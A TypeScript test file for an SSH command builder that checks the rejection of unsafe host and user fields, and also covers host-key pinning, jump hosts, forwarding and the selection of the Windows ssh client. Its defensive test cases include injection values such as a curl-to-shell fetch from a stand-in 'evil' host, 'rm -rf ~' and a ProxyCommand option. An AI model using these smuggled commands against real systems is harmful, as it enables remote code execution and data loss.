import assert from 'node:assert/strict';
import { test } from 'node:test';
import { buildSshCommand, describeSshTarget, isSafeSshHost, isSafeSshUser } from '../sshCommand';
import { EntityMetadata } from '../types';

const entity = (over: Partial<EntityMetadata> = {}): EntityMetadata => ({
  id: 'e1',
  name: 'prod',
  host: 'example.com',
  user: 'deploy',
  isSshEnabled: true,
  ...over,
});

/**
 * `host` and `user` are NOT trusted input. An entity arrives from a shared NAS
 * folder (sync merge) or from a colleague's share, and the envelope's GCM tag
 * authenticates the container, not the plausibility of a field inside it. The
 * composed line is then handed to `terminal.sendText(command, true)` — the
 * `true` presses Enter — so an unquoted metacharacter is a local shell running
 * whatever the sender chose, on the click of Connect.
 *
 * `sshKeyPath` was quoted here from the start; `user@host` never was.
 */

test('a host carrying shell metacharacters is refused, not composed', () => {
  assert.equal(buildSshCommand(entity({ host: 'example.com; curl http://evil/x|sh' })), undefined);
  assert.equal(buildSshCommand(entity({ host: 'example.com`id`' })), undefined);
  assert.equal(buildSshCommand(entity({ host: 'example.com$(id)' })), undefined);
  assert.equal(buildSshCommand(entity({ host: 'a.com\nrm -rf ~' })), undefined);
});

test('a user carrying shell metacharacters is refused', () => {
  assert.equal(buildSshCommand(entity({ user: 'root; id' })), undefined);
  assert.equal(buildSshCommand(entity({ user: 'a b' })), undefined);
});

test('a host that would read as an ssh OPTION is refused', () => {
  // Not a shell problem: ssh's own parser takes a leading dash as a flag.
  assert.equal(buildSshCommand(entity({ host: '-oProxyCommand=sh -c id' })), undefined);
  assert.equal(isSafeSshHost('-oProxyCommand=x'), false);
  assert.equal(isSafeSshUser('-l'), false);
});

test('ordinary hosts and users still compose', () => {
  assert.equal(buildSshCommand(entity()), 'ssh deploy@example.com');
  assert.equal(buildSshCommand(entity({ port: 2222 })), 'ssh -p 2222 deploy@example.com');
  assert.equal(buildSshCommand(entity({ host: '82.165.44.219', user: 'root' })), 'ssh root@82.165.44.219');
  assert.equal(isSafeSshHost('sub.domain.example.com'), true);
  assert.equal(isSafeSshHost('192.168.1.10'), true);
  assert.equal(isSafeSshHost('[2001:db8::1]'), true);
  assert.equal(isSafeSshUser('deploy_user-1'), true);
  assert.equal(isSafeSshUser('CORP\\alice'), true, 'Windows domain accounts are legitimate');
  assert.equal('CORP\\alice'.length, 10, 'a real backslash, not an eaten escape');
});

test('describeSshTarget refuses the same values, so no UI shows a forged target', () => {
  assert.equal(describeSshTarget(entity({ host: 'a.com; id' })), undefined);
  assert.equal(describeSshTarget(entity()), 'deploy@example.com');
});

// ---- the connection-manager options (audit D7/B10) ---------------------------

test('with no pin the human line leaves ssh its own default, which ASKS', () => {
  // The distinction B10 turns on: a person in a terminal can be asked, so nothing is forced
  // and ssh prompts. Forcing accept-new here would remove the very question the audit wanted
  // put back. (The agent's exec, which has nobody to ask, keeps accept-new — see
  // sshExecCommand.ts.)
  assert.equal(buildSshCommand(entity()), 'ssh deploy@example.com');
});

test('with a pin the line demands a match against exactly that key', () => {
  const line = buildSshCommand(entity(), 'linux', { knownHostsFile: '/tmp/k/known_hosts' });

  assert.match(line ?? '', /StrictHostKeyChecking=yes/);
  assert.match(line ?? '', /UserKnownHostsFile="\/tmp\/k\/known_hosts"/);
  assert.equal((line ?? '').includes('accept-new'), false);
});

test('a jump host and a forward reach the line through the shared composer', () => {
  const line = buildSshCommand(
    entity({ agentForward: true, portForwards: [{ kind: 'local', bindPort: 5432, host: 'db', hostPort: 5432 }] }),
    'linux',
    { jump: 'me@bastion.example.com' },
  );

  assert.equal(line, 'ssh -J me@bastion.example.com -A -L 5432:db:5432 deploy@example.com');
});

// --- which ssh the line actually names (2026-08-26) ----------------------------------------
//
// `-A` reached this line for months and forwarded nothing on Windows: the word `ssh` resolves
// through PATH, and where Git for Windows is installed that is an MSYS build which cannot open
// the named pipe our agent listens on. The test above asserts the FLAG is composed, which was
// true throughout. See `sshProgram.ts` for the measurement.

test('on Windows a forwarding line names the client that can reach the agent', () => {
  const line = buildSshCommand(entity({ agentForward: true }), 'win32', {
    builtInExists: () => true,
  });

  assert.equal(line, 'C:/Windows/System32/OpenSSH/ssh.exe -A deploy@example.com');
});

test('on Windows a line that does not forward keeps the bare word', () => {
  // Nobody is moved off their own client for a connection that never needed ours.
  const line = buildSshCommand(entity({}), 'win32', { builtInExists: () => true });

  assert.equal(line, 'ssh deploy@example.com');
});

test('a Windows install without the built-in still gets a line it can run', () => {
  const line = buildSshCommand(entity({ agentForward: true }), 'win32', {
    builtInExists: () => false,
  });

  assert.equal(line, 'ssh -A deploy@example.com');
});

test('off Windows the word is unchanged — PATH was never the problem there', () => {
  const line = buildSshCommand(entity({ agentForward: true }), 'linux', {
    builtInExists: () => true,
  });

  assert.equal(line, 'ssh -A deploy@example.com');
});
